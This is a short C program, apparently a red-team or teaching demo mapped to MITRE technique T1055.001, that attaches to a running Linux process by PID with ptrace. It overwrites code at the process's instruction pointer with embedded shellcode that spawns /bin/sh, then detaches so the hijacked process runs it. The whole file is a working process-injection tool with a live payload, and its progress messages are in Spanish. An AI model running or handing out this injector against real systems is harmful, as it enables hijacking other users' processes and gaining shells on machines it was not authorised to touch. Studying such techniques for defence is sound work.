#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <stdint.h>

/*
 * Shellcode to execute /bin/sh
 * Equivalent to injecting malicious shellcode in Windows (T1055.001)
 */
unsigned char shellcode[] = 
    "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
    "\x5f\x6a\x3b\x58\x99\x0f\x05";

void inject_data(pid_t pid, unsigned char *src, void *dst, int len) {
    uint32_t *s = (uint32_t *) src;
    uint32_t *d = (uint32_t *) dst;
    
    // Write data word by word using ptrace
    for (int i = 0; i < len; i += 4, s++, d++) {
        if (ptrace(PTRACE_POKETEXT, pid, d, *s) < 0) {
            perror("ptrace_poketext failed");
            exit(1);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <PID_del_objetivo>\n", argv[0]);
        exit(1);
    }
    
    pid_t target_pid = atoi(argv[1]);
    struct user_regs_struct regs;
    
    printf("[+] 1. Adjuntándose al proceso objetivo (PID: %d)...\n", target_pid);
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0) {
        perror("Fallo al adjuntar (ptrace_attach)");
        exit(1);
    }
    wait(NULL); // Wait for the process to stop
    printf("[+] Proceso detenido con éxito.\n");
    
    printf("[+] 2. Leyendo los registros actuales (contexto del hilo)...\n");
    if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        perror("Fallo al obtener registros");
        exit(1);
    }
    
    printf("[*] Instruction Pointer (RIP) actual: 0x%llx\n", regs.rip);
    
    printf("[+] 3. Inyectando shellcode en la dirección de RIP...\n");
    // In Windows this would be WriteProcessMemory
    inject_data(target_pid, shellcode, (void*)regs.rip, sizeof(shellcode));
    
    printf("[+] 4. Reanudando la ejecución del proceso (Thread Execution Hijacking)...\n");
    // In Windows this would be ResumeThread
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0) {
        perror("Fallo al desadjuntar");
        exit(1);
    }
    
    printf("[+] Inyección completada. Revisa la terminal del proceso objetivo.\n");
    return 0;
}
